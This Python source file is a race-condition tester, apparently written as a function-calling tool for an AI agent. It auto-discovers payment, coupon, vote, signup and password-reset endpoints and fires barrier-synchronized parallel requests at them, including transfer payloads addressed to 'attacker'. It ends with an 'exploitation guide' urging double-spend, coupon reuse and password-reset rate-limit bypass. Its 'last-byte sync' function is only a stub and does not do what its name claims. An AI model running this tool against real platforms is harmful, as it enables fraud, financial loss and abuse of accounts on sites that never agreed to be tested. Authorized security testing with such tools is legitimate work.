"""
Race condition / TOCTOU vulnerability tester.
Sends parallel requests to exploit time-of-check-to-time-of-use windows.
Critical for payment, coupon, voting, follow, like endpoints on large platforms.
"""

import requests
import time
import threading
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

from tools.target_reachability import (
    format_fallback_notice,
    format_unreachable_error,
    resolve_web_target,
)

HDR = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# Endpoints commonly vulnerable to race conditions
RACE_TARGETS = {
    "coupon_redemption": {
        "paths": ["/api/coupon", "/api/redeem", "/api/voucher", "/api/promo", "/api/discount",
                  "/coupon/apply", "/cart/coupon", "/checkout/coupon", "/apply-coupon"],
        "method": "POST",
        "payloads": [
            {"code": "TEST123"}, {"coupon": "SAVE50"}, {"promo_code": "DISCOUNT"},
            {"voucher": "FREE"}, {"discount_code": "DEAL"},
        ],
        "desc": "Coupon/promo code redemption — apply same code multiple times",
    },
    "money_transfer": {
        "paths": ["/api/transfer", "/api/send", "/api/payment", "/api/withdraw",
                  "/api/payout", "/transfer", "/send-money", "/api/transaction"],
        "method": "POST",
        "payloads": [
            {"amount": 1, "to": "attacker"}, {"amount": "0.01", "recipient": "test"},
        ],
        "desc": "Money transfer — double-spend by sending same request in parallel",
    },
    "vote_like": {
        "paths": ["/api/vote", "/api/like", "/api/upvote", "/api/favorite",
                  "/api/follow", "/api/subscribe", "/api/rate", "/api/review"],
        "method": "POST",
        "payloads": [
            {"id": 1}, {"target_id": 1, "action": "like"},
        ],
        "desc": "Vote/like/follow — bypass single-use restriction",
    },
    "account_creation": {
        "paths": ["/api/register", "/api/signup", "/api/create-account",
                  "/register", "/signup", "/api/invite"],
        "method": "POST",
        "payloads": [
            {"email": "race@test.com", "password": "Test123!"}, 
            {"username": "racetest", "password": "Test123!"},
        ],
        "desc": "Account creation — bypass invite-only or rate limits",
    },
    "file_upload": {
        "paths": ["/api/upload", "/upload", "/api/files", "/api/media",
                  "/api/import", "/api/avatar"],
        "method": "POST",
        "payloads": [],
        "desc": "File upload — bypass quota or overwrite checks",
    },
    "password_reset": {
        "paths": ["/api/reset-password", "/api/forgot-password", "/forgot",
                  "/reset", "/api/password/reset"],
        "method": "POST",
        "payloads": [
            {"email": "test@test.com"}, {"username": "admin"},
        ],
        "desc": "Password reset — generate multiple valid reset tokens",
    },
}


def _send_parallel(url, method, payload, count=10, headers=None):
    """Send N identical requests simultaneously using threading barrier."""
    results = []
    barrier = threading.Barrier(count)
    h = headers or {**HDR, "Content-Type": "application/json"}

    def _worker(idx):
        barrier.wait()  # All threads release at exactly the same time
        start = time.time()
        try:
            if method == "POST":
                r = requests.post(url, json=payload, headers=h, timeout=10, verify=False)
            elif method == "PUT":
                r = requests.put(url, json=payload, headers=h, timeout=10, verify=False)
            elif method == "DELETE":
                r = requests.delete(url, headers=h, timeout=10, verify=False)
            else:
                r = requests.get(url, headers=h, timeout=10, verify=False)
            elapsed = time.time() - start
            return {
                "idx": idx, "status": r.status_code, "size": len(r.text),
                "time": elapsed, "body_hash": hashlib.md5(r.text.encode()).hexdigest(),
                "body_preview": r.text[:200],
            }
        except Exception as e:
            return {"idx": idx, "status": 0, "error": str(e), "time": time.time() - start}

    with ThreadPoolExecutor(max_workers=count) as executor:
        futures = [executor.submit(_worker, i) for i in range(count)]
        for f in as_completed(futures):
            results.append(f.result())

    results.sort(key=lambda x: x["idx"])
    return results


def _analyze_race_results(results):
    """Analyze parallel request results for race condition indicators."""
    indicators = {
        "all_success": False,
        "mixed_status": False,
        "duplicate_success": 0,
        "unique_responses": 0,
        "timing_variance": 0,
    }

    statuses = [r.get("status", 0) for r in results]
    success = [r for r in results if r.get("status") in (200, 201, 202)]
    hashes = set(r.get("body_hash", "") for r in results if r.get("body_hash"))

    indicators["all_success"] = len(success) == len(results)
    indicators["mixed_status"] = len(set(statuses)) > 1
    indicators["duplicate_success"] = len(success)
    indicators["unique_responses"] = len(hashes)

    times = [r.get("time", 0) for r in results if r.get("time")]
    if times:
        indicators["timing_variance"] = max(times) - min(times)

    # Race condition likely if:
    # 1. Multiple successes on an endpoint that should only allow one
    # 2. Mixed responses (some succeed, some fail) — indicates TOCTOU window
    is_vulnerable = False
    confidence = "LOW"

    if indicators["duplicate_success"] > 1 and indicators["mixed_status"]:
        is_vulnerable = True
        confidence = "HIGH"
    elif indicators["all_success"] and indicators["duplicate_success"] > 5:
        is_vulnerable = True
        confidence = "MEDIUM"
    elif indicators["mixed_status"] and indicators["unique_responses"] > 1:
        is_vulnerable = True
        confidence = "MEDIUM"

    return is_vulnerable, confidence, indicators


def _test_last_byte_sync(url, method, payload, count=15):
    """
    Last-byte synchronization technique for precise race conditions.
    Sends all requests with body minus last byte, then sends last byte simultaneously.
    """
    # For HTTP this requires raw socket manipulation
    # Simplified version using threading barrier with minimal delay
    results = _send_parallel(url, method, payload, count)
    return results


def race_test(target, endpoint="", method="POST", payload=None, parallel=15, stream_callback=None):
    """
    Test for race condition vulnerabilities.
    
    target: Base URL
    endpoint: Specific endpoint to test (or auto-discover)
    method: HTTP method
    payload: JSON payload (or auto-generate)
    parallel: Number of parallel requests
    """
    def _emit(msg):
        if stream_callback:
            stream_callback("race_progress", {"message": msg})

    _emit("🌐 Resolving reachable target URL...")
    resolution = resolve_web_target(target, headers=HDR)
    if not resolution.get("ok"):
        _emit("  ❌ Target unreachable across allowed URL variants")
        return format_unreachable_error(target, resolution)

    base = (resolution.get("selected_url") or resolution.get("normalized_url") or target).rstrip("/")
    fallback_note = format_fallback_notice(resolution)
    if fallback_note:
        _emit("  ↪ %s" % fallback_note)

    _emit(f"🎯 Race Condition Tester: {base}")
    start = time.time()
    findings = []

    if endpoint and payload:
        # Test specific endpoint
        _emit(f"🔨 Testing specific endpoint: {endpoint}")
        url = f"{base}{endpoint}" if not endpoint.startswith("http") else endpoint
        
        _emit(f"  Sending {parallel} parallel {method} requests...")
        results = _send_parallel(url, method, payload, parallel)
        
        is_vuln, confidence, indicators = _analyze_race_results(results)
        
        _emit(f"  Results: {indicators['duplicate_success']}/{parallel} succeeded, "
              f"{indicators['unique_responses']} unique responses")
        
        if is_vuln:
            findings.append({
                "type": "race_condition",
                "severity": "HIGH" if confidence == "HIGH" else "MEDIUM",
                "endpoint": endpoint,
                "confidence": confidence,
                "indicators": indicators,
                "desc": f"Race condition detected on {endpoint} ({confidence} confidence). "
                        f"{indicators['duplicate_success']} of {parallel} parallel requests succeeded.",
                "cwe": "CWE-362",
            })
            _emit(f"  🔴 RACE CONDITION DETECTED ({confidence} confidence)!")
        else:
            _emit(f"  ✗ No race condition detected on this endpoint")

        # Show detailed results
        for r in results:
            status_icon = "✅" if r.get("status") in (200, 201) else "❌"
            _emit(f"    {status_icon} Request #{r['idx']}: {r.get('status', 'ERR')} "
                  f"({r.get('size', 0)}b, {r.get('time', 0):.3f}s)")

    else:
        # Auto-discover and test common race-prone endpoints
        _emit(f"🔍 Phase 1: Discovering race-prone endpoints...")
        
        discovered = []
        for category, info in RACE_TARGETS.items():
            for path in info["paths"]:
                url = f"{base}{path}"
                try:
                    # Quick probe
                    r = requests.options(url, headers=HDR, timeout=3, verify=False)
                    if r.status_code != 404:
                        discovered.append({
                            "category": category,
                            "path": path,
                            "url": url,
                            "method": info["method"],
                            "payloads": info["payloads"],
                            "desc": info["desc"],
                            "probe_status": r.status_code,
                        })
                        _emit(f"  ✅ [{r.status_code}] {path} ({category})")
                except Exception:
                    pass
            # Also try HEAD/GET
            for path in info["paths"][:3]:
                url = f"{base}{path}"
                try:
                    r = requests.get(url, headers=HDR, timeout=3, verify=False, allow_redirects=False)
                    if r.status_code not in (404, 0):
                        if not any(d["path"] == path for d in discovered):
                            discovered.append({
                                "category": category,
                                "path": path,
                                "url": url,
                                "method": info["method"],
                                "payloads": info["payloads"],
                                "desc": info["desc"],
                                "probe_status": r.status_code,
                            })
                except Exception:
                    pass

        _emit(f"  Found {len(discovered)} potential race-prone endpoints")

        # Phase 2: Test each discovered endpoint
        _emit("🔨 Phase 2: Testing for race conditions...")
        
        for ep in discovered[:8]:
            _emit(f"\n  Testing {ep['path']} ({ep['category']})...")
            
            for pl in ep["payloads"][:2]:
                _emit(f"    Sending {parallel} parallel {ep['method']} requests...")
                results = _send_parallel(ep["url"], ep["method"], pl, parallel)
                is_vuln, confidence, indicators = _analyze_race_results(results)
                
                if is_vuln:
                    findings.append({
                        "type": "race_condition",
                        "severity": "HIGH" if confidence == "HIGH" else "MEDIUM",
                        "category": ep["category"],
                        "endpoint": ep["path"],
                        "confidence": confidence,
                        "indicators": indicators,
                        "desc": f"Race condition on {ep['path']} ({ep['desc']}). "
                                f"{confidence} confidence — {indicators['duplicate_success']}/{parallel} succeeded.",
                        "cwe": "CWE-362",
                    })
                    _emit(f"    🔴 VULNERABLE! {indicators['duplicate_success']}/{parallel} succeeded ({confidence})")
                    break
                else:
                    _emit(f"    ✗ No race condition ({indicators['duplicate_success']}/{parallel} succeeded)")

        # Phase 3: Test limit-overrun on any 200-responding endpoint
        _emit("\n🔨 Phase 3: Testing limit-overrun race conditions...")
        for ep in discovered[:5]:
            if ep["probe_status"] == 200:
                _emit(f"  Testing limit-overrun on {ep['path']}...")
                # Send a burst of identical GET requests
                results = _send_parallel(ep["url"], "GET", None, 20)
                
                success_count = sum(1 for r in results if r.get("status") == 200)
                rate_limited = sum(1 for r in results if r.get("status") == 429)
                
                if success_count == 20 and rate_limited == 0:
                    _emit(f"    🟡 No rate limiting — all 20 requests returned 200")
                    findings.append({
                        "type": "no_rate_limit_burst",
                        "severity": "LOW",
                        "endpoint": ep["path"],
                        "desc": f"No rate limiting on burst of 20 parallel requests to {ep['path']}",
                    })

    elapsed = time.time() - start

    # Format output
    lines = [
        f"RACE CONDITION SCAN for {base}",
        f"{'='*60}",
        f"Parallel requests: {parallel} | Findings: {len(findings)} | Time: {elapsed:.1f}s\n",
    ]
    if fallback_note:
        lines = [fallback_note, ""] + lines

    if findings:
        for sev in ["HIGH", "MEDIUM", "LOW"]:
            group = [f for f in findings if f["severity"] == sev]
            if group:
                icon = {"HIGH": "🔴", "MEDIUM": "🟡", "LOW": "⚪"}[sev]
                lines.append(f"{icon} {sev} ({len(group)})")
                lines.append("-" * 40)
                for f in group:
                    lines.append(f"  [{f['type']}] {f['desc']}")
                    if f.get("cwe"):
                        lines.append(f"  CWE: {f['cwe']}")
                    if f.get("indicators"):
                        ind = f["indicators"]
                        lines.append(f"  Successes: {ind['duplicate_success']}/{parallel}")
                        lines.append(f"  Unique responses: {ind['unique_responses']}")
                        lines.append(f"  Timing variance: {ind['timing_variance']:.3f}s")
                    lines.append("")

        lines.append("EXPLOITATION GUIDE")
        lines.append("-" * 40)
        lines.append("  1. Use Turbo Intruder (Burp Suite) for precise single-packet attacks")
        lines.append("  2. Try 'last-byte sync' technique for sub-millisecond precision")
        lines.append("  3. For payment endpoints: attempt double-spend / coupon reuse")
        lines.append("  4. For auth endpoints: bypass rate limiting on password resets")
        lines.append("  Impact: Financial loss, privilege escalation, data manipulation")
    else:
        lines.append("No race condition vulnerabilities detected.")
        lines.append("Note: Race conditions may require authenticated sessions to test properly.")
        lines.append("Try providing a specific endpoint and payload for targeted testing.")

    return "\n".join(lines)


TOOL_DEFINITION = {
    "type": "function",
    "function": {
        "name": "race_test",
        "description": "Test for race condition (TOCTOU) vulnerabilities by sending parallel requests. Auto-discovers race-prone endpoints (payments, coupons, votes, account creation, password reset) or tests a specific endpoint. Uses thread barrier synchronization for precise timing. Detects double-spend, coupon reuse, rate limit bypass, and vote manipulation. Critical for e-commerce and social platforms.",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target base URL"
                },
                "endpoint": {
                    "type": "string",
                    "description": "Specific endpoint to test (e.g., '/api/coupon'). Leave empty for auto-discovery."
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST", "PUT", "DELETE"],
                    "description": "HTTP method. Default: POST"
                },
                "parallel": {
                    "type": "integer",
                    "description": "Number of parallel requests (default: 15)"
                }
            },
            "required": ["target"]
        }
    }
}
